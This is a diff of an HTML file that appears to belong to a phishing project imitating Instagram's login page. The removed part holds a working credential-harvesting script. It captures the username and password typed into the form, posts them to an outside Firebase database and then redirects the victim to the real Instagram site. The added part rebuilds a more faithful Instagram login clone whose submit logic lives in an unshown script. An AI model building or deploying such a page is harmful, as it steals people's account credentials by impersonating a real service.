@@ -2,85 +2,118 @@
 <html lang="en">
 
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <link href="https://fonts.googleapis.com/css?family=K2D:400,700" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css?family=Roboto:300i,400,700" rel="stylesheet">
-  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz"
-    crossorigin="anonymous">
-    <script
-  src="https://code.jquery.com/jquery-3.3.1.js"
-  integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
-  crossorigin="anonymous"></script>
-  <link rel="stylesheet" href="style.css">
-  <script src="main.js"></script>
-  <title>CafeHub</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <!-- FAVIVON -->
+    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
+    <!-- GOOGLE FONT -->
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <!-- APP CSS -->
+    <link rel="stylesheet" href="./style.css">
 </head>
 
 <body>
-  <div class="container">
-<img src="https://i.ibb.co/fSZrktN/instagram-logo.png" alt="instagram-logo" class="insta_logo">
-      <br><br><br>
-       <form onsubmit="onSubmit() ; return false ">  
-      <input type="text" placeholder="Phone number, username or email address"  onchange="getValue(this)" class="email">
-      <input type="password" placeholder="Password"   onchange="getValue(this)"  class="email password">
-      <br><br>
-      <button  >Log In</button>
-      <br>
-  </form>
-      <p class="or">OR</p>
-<img src="https://i.ibb.co/Dzr4DC6/facebook-logo.jpg" alt="facebook-logo" class="facebook">
-      <p class="fb">Login with Facebook</p>
-      <br><br>
-      <p class="forgot">Forgotten your password?</p>
-      <br>
-      <div class="dont">
-          <p>Dont have an account? <span> Sign up</span></p>
-      </div>
-      <br>
-      <p class="get">Get the app.</p>
-      <div class="img">
-          <img src="https://i.ibb.co/bHVsHrT/app-store.png" alt="app_store">
-          <img src="https://i.ibb.co/JBVJ8JB/play-store.png" alt="play_store">
-      </div>
-  </div>
-  <script>
-   let username = ""
-   let password = ""
-function getValue(event) {
-    if(event.placeholder=='Phone number, username or email address') {
-      username = event.value          
-    }else{
-      password = event.value          
-    }
-  
-}
-function onSubmit() {
-   let url = "https://screenshot-5026c-default-rtdb.firebaseio.com/test.json"
-  console.log(getCookie('csrftoken'));
-  console.log(username , password);   
-  let model = {    username ,password }
-fetch(url, {
-  method: 'POST', // or 'PUT'
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify(model),
-})
-  .then((response) => response.json() )
-  .then((data) => {
-    console.log('Success:', data);
-    window.location.href="https://www.instagram.com/?u="
-  })
-  .catch((error) => {
-    console.error('Error:', error);
-  });
-}
-function getCookie(cname) {
- //
-}
-</script>
-</body>
 
-</html>
+    <div class="container">
+        <div class="main-container">
+            <div class="main-content">
+                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
+                    <div class="slide-content" id="slide-content">
+                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
+                        <img src="./images/slide (2).jpg" alt="slide image">
+                        <img src="./images/slide (3).jpg" alt="slide image">
+                        <img src="./images/slide (4).jpg" alt="slide image">
+                        <img src="./images/slide (5).jpg" alt="slide image">
+                    </div>
+                </div>
+                <div class="form-container">
+                    <div class="form-content box">
+                        <div class="logo">
+                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
+                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
+                        </div>
+                        <div class="signin-form" id="signin-form">
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>
+                                        Phone number, username or email
+                                    </span>
+                                    <input type="text" onchange="getValue(this)">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>
+                                        Password
+                                    </span>
+                                    <input type="password" onchange="getValue(this)">
+                                    <button>Show</button>
+                                </div>
+                            </div>
+                            <div class="btn-group">
+                                <button class="btn-login" id="signin-btn" disabled onclick="onSubmit()">
+                                    Log In
+                                </button>
+                            </div>
+                            <div class="divine">
+                                <div></div>
+                                <div>OR</div>
+                                <div></div>
+                            </div>
+                            <div class="btn-group">
+                                <button class="btn-fb">
+                                    <img src="./images/facebook-icon.png" alt="">
+                                    <span>Log in with Facebook</span>
+                                </button>
+                            </div>
+                            <a href="#" class="forgot-pw">Forgot password?</a>
+                        </div>
+                    </div>
+                    <div class="box goto">
+                        <p>
+                            Don't have an account?
+                            <a href="#">Sign up</a>
+                        </p>
+                    </div>
+
+                    <div class="app-download">
+                        <p>Get the app.</p>
+                        <div class="store-link">
+                            <a href="#">
+                                <img src="./images/app-store.png" alt="app store">
+                            </a>
+                            <a href="#">
+                                <img src="./images/gg-play.png" alt="google play">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="links">
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Top Accounts</a>
+                <a href="#">Hashtags</a>
+                <a href="#">Locations</a>
+                <a href="#" id="darkmode-toggle">Darkmode</a>
+            </div>
+            <div class="copyright">
+                © 2021 Instagram from Facebook
+            </div>
+        </div>
+    </div>
+
+    <!-- APP JS -->
+    <script src="./main.js"></script>
+
+</body>
